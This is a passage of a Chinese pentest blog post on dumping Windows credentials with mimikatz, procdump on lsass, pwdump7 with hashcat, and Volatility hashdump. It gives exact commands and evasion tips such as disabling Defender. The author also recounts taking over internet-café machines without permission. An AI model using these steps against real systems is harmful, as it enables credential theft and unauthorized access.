@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="TimeS0ng" />
+
+
+
+<meta name="description" content="0x00. 前言渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows密码抓取总结">
+<meta property="og:url" content="http://TimeS0ng.github.io/2018/04/20/Windows密码抓取总结/index.html">
+<meta property="og:site_name" content="TimeS0ng&#39;s blog">
+<meta property="og:description" content="0x00. 前言渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418203056_WR5Aim_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418205101_7Jvn4f_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418204329_wHS2Qi_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418204918_4DUANd_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418212206_7LasW4_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418212557_gNzdRI_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419001635_R2mdci_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419002119_puCgGq_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419111752_6vqNIx_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419110839_6RL5dK_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419111612_Tkq2jz_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419184849_OuzqV7_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419185050_jKbLW5_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419185436_ohOVSp_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180420121521_8LVsuZ_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419190846_DSIMrd_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419192009_pBbNtJ_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419193253_crhGWM_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419195550_4l4ZGP_Screenshot.jpeg">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419200844_4N3J4b_Screenshot.jpeg">
+<meta property="og:updated_time" content="2018-04-20T15:39:35.550Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Windows密码抓取总结">
+<meta name="twitter:description" content="0x00. 前言渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。">
+<meta name="twitter:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418203056_WR5Aim_Screenshot.jpeg">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="TimeS0ng&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Windows密码抓取总结 | TimeS0ng&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">TimeS0ng</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:TimeS0ng@163.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/TimeS0ng" title="GitHub"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://03i0.com">sn00py&#39;s blog</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://edvison.cn">Edvison&#39;s blog</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ph0rse.me/">ph0rse&#39;s blog</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://www.likesec.com">ur10ser&#39;s blog</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注技术，乐于分享</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">TimeS0ng</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">TimeS0ng</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:TimeS0ng@163.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/TimeS0ng" title="GitHub"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-Windows密码抓取总结" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/04/20/Windows密码抓取总结/" class="article-date">
+      <time datetime="2018-04-20T15:39:10.000Z" itemprop="datePublished">2018-04-20</time>
+</a>
+
+ 
+    <a href="/2018/04/20/Windows密码抓取总结/#comments" title="查看评论">
+        <i class="fa fa-comments-o" aria-hidden="true"></i>
+        <span class="count-comment"></span>
+        
+        
+            <span class="disqus-comment-count" data-disqus-identifier="2018/04/20/Windows密码抓取总结/"></span>
+        
+    </a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Windows密码抓取总结
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00. 前言"></a>0x00. 前言</h2><h4 id="渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal-account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。"><a href="#渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal-account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。" class="headerlink" title="渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。"></a>渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。</h4><a id="more"></a>
+<blockquote>
+<p> [本教程具有一定攻击性，仅限于教学使用，不得用于其他用途]</p>
+</blockquote>
+<h2 id="0x01-利用mimikatz获取明文密码"><a href="#0x01-利用mimikatz获取明文密码" class="headerlink" title="0x01. 利用mimikatz获取明文密码"></a>0x01. 利用mimikatz获取明文密码</h2><h4 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-windows-10-emsp-（win-10中有defender会杀掉我们的mimikatz，关掉就好）"><a href="#emsp-emsp-windows-10-emsp-（win-10中有defender会杀掉我们的mimikatz，关掉就好）" class="headerlink" title="&emsp;&emsp;windows 10  &emsp;// （win 10中有defender会杀掉我们的mimikatz，关掉就好）"></a>&emsp;&emsp;windows 10  &emsp;// （win 10中有defender会杀掉我们的mimikatz，关掉就好）</h4><h4 id="emsp-emsp-mimikatz-trunk-emsp-download-here"><a href="#emsp-emsp-mimikatz-trunk-emsp-download-here" class="headerlink" title="&emsp;&emsp;mimikatz_trunk &emsp;// download here"></a>&emsp;&emsp;mimikatz_trunk &emsp;// <a href="http://blog.gentilkiwi.com/mimikatz" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-首先用管理员账号运行cmd-exe，这样才能让mimikatz正常运行"><a href="#1-首先用管理员账号运行cmd-exe，这样才能让mimikatz正常运行" class="headerlink" title="1. 首先用管理员账号运行cmd.exe，这样才能让mimikatz正常运行 :)"></a>1. 首先用管理员账号运行cmd.exe，这样才能让mimikatz正常运行 :)</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418203056_WR5Aim_Screenshot.jpeg" alt=""></p>
+<h4 id="2-紧接着再进入mimikatz，运行命令"><a href="#2-紧接着再进入mimikatz，运行命令" class="headerlink" title="2. 紧接着再进入mimikatz，运行命令"></a>2. 紧接着再进入mimikatz，运行命令</h4><blockquote>
+<p>privilege::debug</p>
+<p>sekurlsa::logonpasswords</p>
+</blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418205101_7Jvn4f_Screenshot.jpeg" alt=""></p>
+<blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418204329_wHS2Qi_Screenshot.jpeg" alt=""></p>
+</blockquote>
+<h4 id="3-此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文"><a href="#3-此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文" class="headerlink" title="3. 此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文"></a>3. 此时我们就能得到username，password的密文，给大家推荐个<a href="https://www.somd5.com" target="_blank" rel="external">网站-here</a>，这里可以很容易的解密大多数密文</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418204918_4DUANd_Screenshot.jpeg" alt=""></p>
+<h2 id="0x02-利用procdump-amp-mimikatz获取密码"><a href="#0x02-利用procdump-amp-mimikatz获取密码" class="headerlink" title="0x02. 利用procdump &amp; mimikatz获取密码"></a>0x02. 利用procdump &amp; mimikatz获取密码</h2><h4 id="实验环境：-1"><a href="#实验环境：-1" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-1-windows-7"><a href="#emsp-emsp-1-windows-7" class="headerlink" title="&emsp;&emsp;1. windows 7"></a>&emsp;&emsp;1. windows 7</h4><h4 id="emsp-emsp-2-procdump-emsp-download-here"><a href="#emsp-emsp-2-procdump-emsp-download-here" class="headerlink" title="&emsp;&emsp;2. procdump &emsp;// download here"></a>&emsp;&emsp;2. procdump &emsp;// <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="external">download here</a></h4><h4 id="emsp-emsp-3-mimikatz-trunk"><a href="#emsp-emsp-3-mimikatz-trunk" class="headerlink" title="&emsp;&emsp;3. mimikatz_trunk"></a>&emsp;&emsp;3. mimikatz_trunk</h4><h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤:"></a>实验步骤:</h4><h4 id="1-首先用procdump下载LSASS进程的内存，因为procdump是Microsoft-Sysinternals-tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd-）"><a href="#1-首先用procdump下载LSASS进程的内存，因为procdump是Microsoft-Sysinternals-tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd-）" class="headerlink" title="1. 首先用procdump下载LSASS进程的内存，因为procdump是Microsoft Sysinternals tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd ）"></a>1. 首先用procdump下载LSASS进程的内存，因为procdump是Microsoft Sysinternals tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd ）</h4><blockquote>
+<p>C:\Users\times0ng\Desktop\Procdump\procdump.exe -accepteula -ma lsass.exe  C:\Users\times0ng\Desktop\lsass.dmp</p>
+</blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418212206_7LasW4_Screenshot.jpeg" alt=""></p>
+<h4 id="2-接着用mimikatz打开dmp文件，获取内存中的内容-emsp-（-lsass-dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式-）"><a href="#2-接着用mimikatz打开dmp文件，获取内存中的内容-emsp-（-lsass-dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式-）" class="headerlink" title="2. 接着用mimikatz打开dmp文件，获取内存中的内容 &emsp;// （ lsass.dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式 ）"></a>2. 接着用mimikatz打开dmp文件，获取内存中的内容 &emsp;// （ lsass.dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式 ）</h4><blockquote>
+<p>C:\Users\times0ng\Desktop\mimikatz_trunk\x64\mimikatz.exe</p>
+<p>sekurlsa::minidump C:\Users\time0sng\Desktop\lsass.dmp</p>
+<p>sekurlsa::tspkg</p>
+</blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418212557_gNzdRI_Screenshot.jpeg" alt=""></p>
+<h2 id="0x03-利用pwdump7获取密码"><a href="#0x03-利用pwdump7获取密码" class="headerlink" title="0x03. 利用pwdump7获取密码"></a>0x03. 利用<strong>pwdump7</strong>获取密码</h2><p>实验环境：</p>
+<h4 id="emsp-emsp-windows-7"><a href="#emsp-emsp-windows-7" class="headerlink" title="&emsp;&emsp;windows 7"></a>&emsp;&emsp;windows 7</h4><h4 id="emsp-emsp-pwdump7-emsp-download-here"><a href="#emsp-emsp-pwdump7-emsp-download-here" class="headerlink" title="&emsp;&emsp;pwdump7 &emsp;// download here"></a>&emsp;&emsp;<strong>pwdump7</strong> &emsp;// <a href="http://passwords.openwall.net/b/pwdump/pwdump7.zip" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤：-1"><a href="#实验步骤：-1" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-直接用管理员运行cmd，再运行pwdump7-exe"><a href="#1-直接用管理员运行cmd，再运行pwdump7-exe" class="headerlink" title="1. 直接用管理员运行cmd，再运行pwdump7.exe"></a>1. 直接用管理员运行cmd，再运行pwdump7.exe</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419001635_R2mdci_Screenshot.jpeg" alt=""></p>
+<h4 id="2-用hashcat直接跑NTLM密码"><a href="#2-用hashcat直接跑NTLM密码" class="headerlink" title="2. 用hashcat直接跑NTLM密码"></a>2. 用hashcat直接跑NTLM密码</h4><blockquote>
+<p>hashcat -m 1000 AFC44EE7351D61D00698796DA06B1EBF /usr/share/wordlists/sqlmap.txt –force</p>
+</blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419002119_puCgGq_Screenshot.jpeg" alt=""></p>
+<h2 id="0x04-利用虚拟机文件获取密码"><a href="#0x04-利用虚拟机文件获取密码" class="headerlink" title="0x04. 利用虚拟机文件获取密码"></a>0x04. 利用虚拟机文件获取密码</h2><h4 id="关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：PowerMemory、quarks-pwdump-等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！"><a href="#关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：PowerMemory、quarks-pwdump-等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！" class="headerlink" title="关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：PowerMemory、quarks pwdump 等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！"></a>关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：<a href="https://github.com/giMini/PowerMemory" target="_blank" rel="external"><strong>PowerMemory</strong></a>、<a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="external"><strong>quarks pwdump </strong></a>等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！</h4><h4 id="接下来我们将获取Windows-7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生-vmss-和-vmem-文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：Memoryze-、DumpIt"><a href="#接下来我们将获取Windows-7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生-vmss-和-vmem-文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：Memoryze-、DumpIt" class="headerlink" title="接下来我们将获取Windows 7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生 .vmss 和 .vmem 文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：Memoryze 、DumpIt"></a>接下来我们将获取Windows 7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生 <em>.vmss 和 </em>.vmem 文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：<a href="https://www.fireeye.com/services/freeware/memoryze.html" target="_blank" rel="external">Memoryze</a> 、<a href="http://qpdownload.com/dumpit/" target="_blank" rel="external">DumpIt</a></h4><h4 id="实验环境：-2"><a href="#实验环境：-2" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-windows-7-挂起状态"><a href="#emsp-emsp-windows-7-挂起状态" class="headerlink" title="&emsp;&emsp;windows 7 挂起状态"></a>&emsp;&emsp;windows 7 挂起状态</h4><h4 id="emsp-emsp-Vmss2core-emsp-download-here"><a href="#emsp-emsp-Vmss2core-emsp-download-here" class="headerlink" title="&emsp;&emsp;Vmss2core &emsp;// download here"></a>&emsp;&emsp;Vmss2core &emsp;// <a href="https://labs.vmware.com/flings/vmss2core#summary" target="_blank" rel="external">download here</a></h4><h4 id="emsp-emsp-Volatility-emsp-download-here"><a href="#emsp-emsp-Volatility-emsp-download-here" class="headerlink" title="&emsp;&emsp;Volatility  &emsp; // download here"></a>&emsp;&emsp;Volatility  &emsp; // <a href="http://www.volatilityfoundation.org/26" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤：-2"><a href="#实验步骤：-2" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-运行Vmss2core解析虚拟机文件，生成memory-dmp文件"><a href="#1-运行Vmss2core解析虚拟机文件，生成memory-dmp文件" class="headerlink" title="1. 运行Vmss2core解析虚拟机文件，生成memory.dmp文件"></a>1. 运行Vmss2core解析虚拟机文件，生成memory.dmp文件</h4><blockquote>
+<p>./vmss2core-mac64 -W /Users/apple1/Documents/Virtual\ Machines.localized/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64-89925192.vmss /Users/apple1/Documents/Virtual\ Machines.localized/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64-89925192.vmem </p>
+</blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419111752_6vqNIx_Screenshot.jpeg" alt=""></p>
+<h4 id="2-利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，-profile-Win7SP1x64-架构一定要指定正确，不然会找不到地址"><a href="#2-利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，-profile-Win7SP1x64-架构一定要指定正确，不然会找不到地址" class="headerlink" title="2. 利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，--profile=Win7SP1x64 架构一定要指定正确，不然会找不到地址"></a>2. 利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，<strong>-</strong>-profile=Win7SP1x64 架构一定要指定正确，不然会找不到地址</h4><blockquote>
+<p>./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone hivelist -f memory.dmp –profile=Win7SP1x64</p>
+</blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419110839_6RL5dK_Screenshot.jpeg" alt=""></p>
+<h4 id="3-接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML-hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！"><a href="#3-接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML-hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！" class="headerlink" title="3. 接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！"></a>3. 接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！</h4><blockquote>
+<p>./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone hashdump -f memory.dmp –profile=Win7SP1x64 sys-offset=0xfffff8a000024010 sam-offset=0xfffff8a000b33010</p>
+</blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419111612_Tkq2jz_Screenshot.jpeg" alt=""></p>
+<h2 id="0x05-利用kali-ISO获取密码"><a href="#0x05-利用kali-ISO获取密码" class="headerlink" title="0x05. 利用kali ISO获取密码"></a>0x05. 利用kali ISO获取密码</h2><h4 id="这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。"><a href="#这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。" class="headerlink" title="这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。"></a>这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。</h4><h4 id="在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。"><a href="#在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。" class="headerlink" title="在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。"></a>在开始之前我们应该先准备一个USB启动盘，制作方法可以看我<a href="https://times0ng.github.io/2018/03/01/kali安装KVM入坑笔记/">以前的文章</a>，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。</h4><h4 id="实验环境：-3"><a href="#实验环境：-3" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-windows-10"><a href="#emsp-emsp-windows-10" class="headerlink" title="&emsp;&emsp;windows 10"></a>&emsp;&emsp;windows 10</h4><h4 id="emsp-emsp-kali-ISO-emsp-download-here"><a href="#emsp-emsp-kali-ISO-emsp-download-here" class="headerlink" title="&emsp;&emsp;kali ISO &emsp;// download here"></a>&emsp;&emsp;kali ISO &emsp;// <a href="https://www.kali.org/downloads/" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤：-3"><a href="#实验步骤：-3" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-首先将kali-ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前-）"><a href="#1-首先将kali-ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前-）" class="headerlink" title="1. 首先将kali 